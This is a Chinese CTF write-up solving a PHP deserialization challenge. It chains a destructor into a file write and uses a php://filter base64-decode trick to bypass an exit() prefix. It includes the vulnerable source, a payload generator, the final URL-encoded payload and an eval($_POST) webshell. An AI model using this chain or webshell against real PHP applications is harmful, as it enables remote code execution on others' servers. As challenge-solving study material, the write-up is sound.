![[Pasted image 20230227192525.png|500]]
好长的hint.jpg

```php
<?php
error_reporting(0);

class A {
    protected $store;
    protected $key;
    protected $expire;

    public function __construct($store, $key = 'flysystem', $expire = null) {
        $this->key = $key;
        $this->store = $store;
        $this->expire = $expire;
    }

    public function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);

        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }

        return $contents;
    }

    public function getForStorage() {
        $cleaned = $this->cleanContents($this->cache);
        return json_encode([$cleaned, $this->complete]);
    }

    public function save() {
        $contents = $this->getForStorage();
        $this->store->set($this->key, $contents, $this->expire);
    }

    public function __destruct() {
        if (!$this->autosave) {
            $this->save();
        }
    }
}

class B {
    protected function getExpireTime($expire): int {
        return (int) $expire;
    }

    public function getCacheKey(string $name): string {
        return $this->options['prefix'] . $name;
    }

    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }

        $serialize = $this->options['serialize'];

        return $serialize($data);
    }

    public function set($name, $value, $expire = null): bool{
        $this->writeTimes++;

        if (is_null($expire)) {
            $expire = $this->options['expire'];
        }

        $expire = $this->getExpireTime($expire);
        $filename = $this->getCacheKey($name);

        $dir = dirname($filename);

        if (!is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        $data = $this->serialize($value);

        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);

        if ($result) {
            return true;
        }

        return false;
    }

}

if (isset($_GET['src']))
{
    highlight_file(__FILE__);
}

$dir = "uploads/";

if (!is_dir($dir))
{
    mkdir($dir);
}
unserialize($_GET["data"]);
```

获取`flag`的途径大概只有`B::set`中的`file_put_contents`

```php
$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
$result = file_put_contents($filename, $data);
```

但是写入的`data`前面跟上了

```php
<?php
// xxxxxxxxxxxx
 exit();?>

```

于是无法通过直接写入PHP代码来实现RCE

但是由于`file_put_contents`支持伪协议，可以构造设法使`filename`为`php://filter/write=convert.base64-decode/resource=shell.php`，通过base64解码破坏掉开头的PHP

# `set`中`filename`的控制

```php
public function set($name, $value, $expire = null): bool{
	// ...
	$filename = $this->getCacheKey($name);
	// ...
}
```

`filename`由传给`set`的`name`参数通过`getCacheKey`得到

```php
public function getCacheKey(string $name): string {
	return $this->options['prefix'] . $name;
}
```

`getCacheKey`简单地将`options['prefix']`同`name`拼接，因此令`options['prefix']`为`''`，`name`为`'php://filter/write=convert.base64-decode/resource=shell.php'`即可

# `set`中`data`处理

```php
$data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
```

PHP的`base64_decode`会忽略掉那些非法字符，于是上面的前缀只有`php//xxxxxxxxxxxxexit`共21个字符会作为base64被解析

为了使我们经过base64编码之后的木马被顺利解析，需要将前缀被解析的字符凑到4的倍数个，于是`data`可以简单地设为`'000' . '<base64-encoded-php-code>'`

```php
$data = $this->serialize($value);
```

```php
protected function serialize($data): string {
	if (is_numeric($data)) {
		return (string) $data;
	}

	$serialize = $this->options['serialize'];

	return $serialize($data);
}
```

`data`由`value`参数经过`serialize`的处理得到，而`B`中`serialize`函数通过可变变量调用函数处理`data`

于是设置`options['serialize']`为`'strval'`即可原样返回为

# `A`的处理

`B`并不存在可用的魔术方法来在反序列化时执行代码，只能从`A`中寻找突破口

```php
public function __destruct() {
	if (!$this->autosave) {
		$this->save();
	}
}
```

发现`A`有一个`__destruct`魔术方法，调用了`save`函数

```php
public function save() {
	$contents = $this->getForStorage();
	$this->store->set($this->key, $contents, $this->expire);
}
```

巧的是`save`刚好存在`set`函数的调用，令`store`为`B`即可

`set`的`name`参数通过`key`设置

`value`参数为`contents`，通过`getForStorage`函数获得

```php
public function getForStorage() {
	$cleaned = $this->cleanContents($this->cache);
	return json_encode([$cleaned, $this->complete]);
}
```

```php
public function cleanContents(array $contents) {
	$cachedProperties = array_flip([...]);

	foreach ($contents as $path => $object) {
		if (is_array($object)) {
			$contents[$path] = array_intersect_key($object, $cachedProperties);
		}
	}

	return $contents;
}
```

`cleanContents`可通过控制`contents`为空数组来返回空数组，也就是令`cache`为`[]`

令`complete`为`'000' . '<base64-encoded-php-code>'`，由于`json_encode`不产生base64有效字符，所以不会影响解码

# payload生成

```php
<?php

class A
{
    protected $store;
    protected $key = 'php://filter/write=convert.base64-decode/resource=shell.php';
    protected $expire;

    public function __construct()
    {
        $this->store = new B();
        $this->cache = [];
        $this->complete = '000PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ID8+';
    }
}

class B
{
    public function __construct()
    {
        $this->options = array(
            'prefix' => '',
            'serialize' => 'strval'
        );
    }
}

print(urlencode(serialize(new A())));
```

其中`PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ID8+`为`<?php eval($_POST['a']); ?>`的base64编码

运行得到payload

```
O%3A1%3A%22A%22%3A5%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22serialize%22%3Bs%3A6%3A%22strval%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A39%3A%22000PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7ID8%2B%22%3B%7D
```

![[Pasted image 20230227230646.png|1000]]

#Web #PHP #serialization #base64 #伪协议 #可变变量